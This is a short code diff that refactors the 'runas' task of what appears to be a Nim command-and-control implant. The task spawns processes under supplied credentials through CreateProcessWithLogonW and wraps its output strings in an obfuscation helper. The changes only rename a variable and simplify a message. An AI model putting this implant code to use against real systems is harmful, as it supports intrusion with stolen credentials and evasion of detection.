@@ -1,7 +1,7 @@
 import ../utils/m_responses
 import ../utils/debug
 import ../utils/strenc
-import std/[json, strformat, strutils]
+import std/[json, strformat]
 
 when defined(windows):
   import winim/lean
@@ -58,7 +58,7 @@ proc runas*(taskId: string, params: JsonNode): JsonNode =
       debug &"[DEBUG] NetOnly: {netonly}"
       
       # Call CreateProcessWithLogonW
-      let result = CreateProcessWithLogonW(
+      let createResult = CreateProcessWithLogonW(
         wUsername,
         wDomain,
         wPassword,
@@ -72,7 +72,7 @@ proc runas*(taskId: string, params: JsonNode): JsonNode =
         addr pi
       )
       
-      if result == 0:
+      if createResult == 0:
         let err = GetLastError()
         output.add(obf("[-] Failed to create process with alternate credentials\n"))
         output.add(obf("[-] Error code: {err}\n"))
@@ -99,8 +99,7 @@ proc runas*(taskId: string, params: JsonNode): JsonNode =
       # For interactive mode, use GetProcessId for accuracy with impersonation
       let actualPid = if netonly: pi.dwProcessId else: GetProcessId(pi.hProcess)
       
-      let logonType = if netonly: obf("network-only") else: obf("interactive")
-      output.add(obf("[+] Successfully spawned process as {domain}\\{username} ({logonType})\n"))
+      output.add(obf("[+] Successfully spawned process as {domain}\\{username}\n"))
       output.add(obf("[+] Process: {program}\n"))
       if args.len > 0:
         output.add(obf("[+] Arguments: {args}\n"))
